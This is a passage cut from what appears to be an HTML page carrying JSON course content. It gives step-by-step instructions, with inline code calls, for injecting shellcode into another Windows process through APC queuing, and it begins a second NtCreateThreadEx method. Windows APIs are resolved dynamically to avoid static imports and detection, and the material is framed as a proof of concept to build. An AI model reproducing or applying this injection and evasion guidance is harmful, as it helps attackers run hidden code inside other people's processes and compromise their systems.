memory: `BOOL writeSuccess = CALL_RESOLVED_API(g_ResolvedAPIs.pWriteProcessMemory, hProcess, remoteBuffer, shellcode.data(), shellcode.size(), NULL);` (Or use `pNtWriteVirtualMemory`). Check success.\r\n    4.  Find a suitable thread in the target process. This is slightly tricky without static imports like `CreateToolhelp32Snapshot`. You might need to resolve `CreateToolhelp32Snapshot`, `Thread32First`, `Thread32Next` dynamically as well, or rely on `NtGetNextThread` if you resolved it (less common). A simpler approach for a POC might be to target the main thread (often the first one enumerated or thread ID != PID).\r\n    5.  Get a handle to the target thread: `HANDLE hThread = CALL_RESOLVED_API(g_ResolvedAPIs.pOpenThread, THREAD_ALL_ACCESS, FALSE, targetThreadId);` (Need `pOpenThread` resolved, or use `NtOpenThread`). Check handle validity.\r\n    6.  Queue the APC: `DWORD queueSuccess = CALL_RESOLVED_API(g_ResolvedAPIs.pQueueUserAPC, (PAPCFUNC)remoteBuffer, hThread, NULL);` (Need `pQueueUserAPC` resolved, or use `pNtQueueApcThread` which is `NTSTATUS` based). Check success.\r\n    7.  Close handles: `CALL_RESOLVED_API(g_ResolvedAPIs.pCloseHandle, hThread); CALL_RESOLVED_API(g_ResolvedAPIs.pCloseHandle, hProcess);` (Or `pNtClose`).\r\n\r\n*   **Error Checking:** After *every* API call, check the return value. If it indicates failure, print an error message (including `GetLastErrorResolved()`) and return `FALSE`.\r\n\r\n**Step 6: Implementing Injection Method 2 (e.g., Native Thread)**\r\n\r\nThis function will encapsulate the `NtCreateThreadEx` injection logic from Module 3, using dynamically resolved APIs.\r\n\r\n*   **Function Signature:** `BOOL ExecuteInjectionNativeThread(DWORD targetPid, const std::vector<BYTE>& shellcode)`\r\n*   **Steps (using"
    }
  ]
}
        </script>
    
    </div>
    <script src="../script.js"></script> <!-- Include script based on flag -->
</body>
</html>
